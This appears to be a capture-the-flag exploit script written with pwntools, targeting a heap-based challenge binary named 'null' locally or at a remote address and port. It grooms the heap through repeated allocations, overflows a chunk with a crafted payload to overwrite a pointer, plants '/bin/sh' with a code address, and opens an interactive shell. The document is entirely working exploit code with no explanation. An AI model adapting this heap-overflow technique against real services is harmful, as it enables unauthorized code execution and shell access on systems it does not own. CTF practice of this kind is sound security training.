from pwn import *

local=1
pc='./null'
remote_addr="47.75.57.242"
remote_port=5000

p = process(pc) if local else remote(remote_addr,remote_port)

def ru(a):
    return p.recvuntil(a)

def sn(a):
    p.send(a) 

def rl():
    return p.recvline()

def sl(a):
    p.sendline(a)

def sa(a,b):
    p.sendafter(a,b)

def sla(a,b):
    p.sendlineafter(a,b)

def choice(index):
    sla('Action: ',str(index))

def alloc(size,padnum,isw):
    choice(1)
    sla(': ',str(size))
    sla(': ',str(padnum))
    sla(": ",str(isw))
    if(isw):
        ru(': ')

def inp(content):
    sn(content)
    sleep(0.5)

def hack():
    passwd="i'm ready for challenge\n"
    sa(": \n",passwd)
    ru('exit\n')

    for _ in range(16):
        alloc(0x3000,1000,0)
    alloc(0x3000,345,0)

    alloc(0xa00,0,0)
    alloc(0xa00,0,0)
    alloc(0xd0+0x170,0,0)
    alloc(0xc0,0,0)
    alloc(0xc0,0,1)

    payload='A'+p64(0)*6+p64(0x4000000)*2+p64(0x300000000)+p64(0x60201d)*10
    inp((0xc0-1)*'A')
    inp(payload)
    alloc(0x68,0,1)
    payload='/bin/sh\x00'+'A'*3+p64(0x00400978)
    payload=payload.ljust(0x68,'\x00')
    inp(payload)
    p.interactive()

hack()
